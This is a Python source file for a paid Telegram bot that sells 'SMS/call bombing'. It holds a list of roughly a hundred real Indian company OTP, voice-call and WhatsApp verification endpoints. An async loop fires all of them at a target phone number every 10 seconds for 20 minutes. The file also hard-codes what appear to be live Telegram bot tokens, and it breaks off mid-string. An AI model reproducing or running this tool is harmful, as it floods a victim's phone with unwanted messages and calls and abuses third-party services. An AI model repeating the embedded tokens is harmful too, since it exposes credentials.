import telebot
import aiohttp
import asyncio
import requests
import json
import os
import threading
import time
from telebot import types
from datetime import datetime, timedelta
import logging
import re
import random
import string

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
DEFAULT_MAIN_BOT_TOKEN = "7883509707:AAFyFxvUNmFlmvAgGub5kZ9KTGcXw7iSOYo"
DEFAULT_ADMIN_BOT_TOKEN = "8353268447:AAEFfkkubAfWldYfUdOSE7sHrK2taZl_YXs"
OWNER_ID = 8458169644

# Default Settings
CHANNELS = {"channel": "@thomasXstoreee"}
CHANNEL_LINKS = {"channel": "https://t.me/thomasXstoreee"}
OWNER_USERNAME = "@TGxTHOMASx"
START_CREDITS = 2
REF_CREDITS = 1

# Credit Prices
CREDIT_PRICES = {
    "25": {"credits": 2, "label": "₹25 → 2 Credits"},
    "50": {"credits": 5, "label": "₹50 → 5 Credits"},
    "100": {"credits": 12, "label": "₹100 → 12 Credits"},
    "200": {"credits": 25, "label": "₹200 → 25 Credits"}
}
PREMIUM_PRICE = {"price": "999", "days": 30, "daily_credits": 20, "label": "₹999 → 1 Month Premium"}

# Files
USERS_FILE = "users.json"
SETTINGS_FILE = "settings.json"
ADMINS_FILE = "admins.json"
APIS_FILE = "apis.json"
BLOCKED_FILE = "blocked.json"
GIFTCODES_FILE = "giftcodes.json"

# Active tasks tracker
active_tasks = {}

# ==================== ULTIMATE 900+ APIS ====================
ULTIMATE_APIS = [
    # CALL BOMBING
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    
    # WHATSAPP
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    
    # SMS BOMBING (300+)
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "Dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "LendingPlate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPink", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagine", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital Biz", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigCash", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "MyGov", "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "AstroSage", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

# ==================== FILE OPERATIONS ====================
def init_files():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({}, f)
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w") as f:
            json.dump({
                "bot_active": True, 
                "channels": CHANNELS, 
                "channel_links": CHANNEL_LINKS, 
                "owner_username": OWNER_USERNAME, 
                "credit_prices": CREDIT_PRICES, 
                "premium_price": PREMIUM_PRICE,
                "main_bot_token": DEFAULT_MAIN_BOT_TOKEN,
                "admin_bot_token": DEFAULT_ADMIN_BOT_TOKEN
            }, f)
    if not os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "w") as f:
            json.dump([OWNER_ID], f)
    if not os.path.exists(APIS_FILE):
        with open(APIS_FILE, "w") as f:
            api_data = [{"id": i, "name": api["name"], "url": str(api["url"]), "method": api["method"], "headers": api["headers"], "data": str(api["data"]), "active": True} for i, api in enumerate(ULTIMATE_APIS)]
            json.dump(api_data, f, indent=2)
    if not os.path.exists(BLOCKED_FILE):
        with open(BLOCKED_FILE, "w") as f:
            json.dump([], f)
    if not os.path.exists(GIFTCODES_FILE):
        with open(GIFTCODES_FILE, "w") as f:
            json.dump({}, f)

init_files()

def load_json(file):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except:
        return {} if file != BLOCKED_FILE and file != ADMINS_FILE else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

users = load_json(USERS_FILE)
settings = load_json(SETTINGS_FILE)
admins = load_json(ADMINS_FILE)
apis_db = load_json(APIS_FILE)
blocked = load_json(BLOCKED_FILE)
giftcodes = load_json(GIFTCODES_FILE)

# ✅ DYNAMIC TOKEN LOADING - YE NEW HAI
MAIN_BOT_TOKEN = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
ADMIN_BOT_TOKEN = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)

# Initialize bots with dynamically loaded tokens
bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")

logger.info(f"✅ Main bot loaded: @{bot.get_me().username}")
logger.info(f"✅ Admin bot loaded: @{admin_bot.get_me().username}")

# ==================== GIFT CODE SYSTEM (NEW) ====================
def generate_gift_code(length=8):
    """Generate random gift code"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def create_gift_code(credits, uses=1, expires_days=None):
    """Create new gift code"""
    code = generate_gift_code()
    while code in giftcodes:
        code = generate_gift_code()
    
    gift_data = {
        "code": code,
        "credits": credits,
        "max_uses": uses,
        "used_by": [],
        "created": str(datetime.now()),
        "expires": str(datetime.now() + timedelta(days=expires_days)) if expires_days else None
    }
    
    giftcodes[code] = gift_data
    save_json(GIFTCODES_FILE, giftcodes)
    return code

def redeem_gift_code(uid, code):
    """Redeem gift code"""
    global giftcodes
    giftcodes = load_json(GIFTCODES_FILE)
    
    code = code.upper()
    if code not in giftcodes:
        return {"success": False, "message": "❌ Invalid gift code!"}
    
    gift = giftcodes[code]
    
    # Check expiry
    if gift.get("expires"):
        if datetime.now() > datetime.fromisoformat(gift["expires"]):
            return {"success": False, "message": "❌ Gift code expired!"}
    
    # Check if already used by user
    if str(uid) in gift["used_by"]:
        return {"success": False, "message": "❌ You already used this code!"}
    
    # Check max uses
    if len(gift["used_by"]) >= gift["max_uses"]:
        return {"success": False, "message": "❌ Gift code limit reached!"}
    
    # Redeem
    gift["used_by"].append(str(uid))
    giftcodes[code] = gift
    save_json(GIFTCODES_FILE, giftcodes)
    
    # Add credits
    if str(uid) not in users:
        users[str(uid)] = {"credits": 0, "joined": str(datetime.now())}
    users[str(uid)]["credits"] = users[str(uid)].get("credits", 0) + gift["credits"]
    save_json(USERS_FILE, users)
    
    return {"success": True, "message": f"✅ Redeemed {gift['credits']} credits!", "credits": gift["credits"]}

# ==================== HELPER FUNCTIONS ====================
def is_admin(uid):
    return uid in admins

def is_blocked(uid):
    return uid in blocked

def check_channel(uid):
    try:
        channels = settings.get("channels", CHANNELS)
        for cid in channels.values():
            member = bot.get_chat_member(cid, uid)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        return True
    except:
        return False

def is_premium(uid):
    user = users.get(str(uid), {})
    if "premium_until" not in user:
        return False
    exp = datetime.fromisoformat(user["premium_until"])
    return datetime.now() < exp

def reset_daily_credits():
    """Reset premium credits daily at midnight"""
    while True:
        now = datetime.now()
        next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_seconds = (next_midnight - now).total_seconds()
        time.sleep(wait_seconds)
        
        premium_credits = settings.get("premium_price", PREMIUM_PRICE).get("daily_credits", 20)
        for uid, data in users.items():
            if is_premium(int(uid)):
                users[uid]["credits"] = users[uid].get("credits", 0) + premium_credits
                try:
                    bot.send_message(int(uid), f"🎁 <b>Premium Daily Credits!</b>\n\n+{premium_credits} credits added to your account!")
                except:
                    pass
        save_json(USERS_FILE, users)

# Start daily reset thread
threading.Thread(target=reset_daily_credits, daemon=True).start()

def main_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start")
    kb.row("💰 My Credits", "📊 Stats")
    kb.row("🔗 Refer", "💳 Buy Credits")
    kb.row("🎁 Redeem Code", "❓ Help")
    kb.row("📞 Owner")
    return kb

def show_join(cid):
    mk = types.InlineKeyboardMarkup()
    channels = settings.get("channels", CHANNELS)
    links = settings.get("channel_links", CHANNEL_LINKS)
    for name, link in links.items():
        mk.add(types.InlineKeyboardButton(f"Join {name.title()}", url=link))
    mk.add(types.InlineKeyboardButton("✅ Joined - Verify", callback_data="verify"))
    bot.send_message(cid, "🚫 <b>Join Required!</b>\n\nJoin all channels to use this bot:", reply_markup=mk)

# ==================== API BOMBING LOGIC ====================
async def hit_api(session, api, phone, stats):
    """Hit single API"""
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10)"
        
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1
        else:
            async with session.get(url, headers=headers, timeout=5, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1
        stats["total"] += 1
    except:
        stats["fail"] += 1
        stats["total"] += 1

async def bombing_task(phone, chat_id, msg_id, duration=1200):
    """Main bombing task - 20 minutes"""
    stats = {"total": 0, "success": 0, "fail": 0, "running": True}
    start_time = time.time()
    end_time = start_time + duration
    
    active_tasks[chat_id] = stats
    
    # Get active APIs
    active_apis = [api for api in ULTIMATE_APIS if apis_db[ULTIMATE_APIS.index(api)]["active"]]
    
    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() < end_time and stats["running"]:
            # Update stats every 10 seconds
            elapsed = time.time() - start_time
            remaining = int(end_time - time.time())
            
            mins = remaining // 60
            secs = remaining % 60
            
            progress = (elapsed / duration) * 100
            bar = "█" * int(progress / 5) + "░" * (20 - int(progress / 5))
            
            status_msg = f"""
🔥 <b>API BOMBING IN PROGRESS</b>

📱 Number: <code>{phone}</code>

⏱️ Time Left: <b>{mins}m {secs}s</b>
{bar} {progress:.1f}%

📊 <b>Statistics:</b>
✅ Success: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🎯 Total Hits: <b>{stats['total']}</b>
🚀 Active APIs: <b>{len(active_apis)}</b>

💡 Bot is hitting APIs continuously...
"""
            
            try:
                bot.edit_message_text(status_msg, chat_id, msg_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{chat_id}")))
            except:
                pass
            
            # Hit all APIs
            tasks = [hit_api(session, api, phone, stats) for api in active_apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(10)
    
    # Final report
    final_msg = f"""
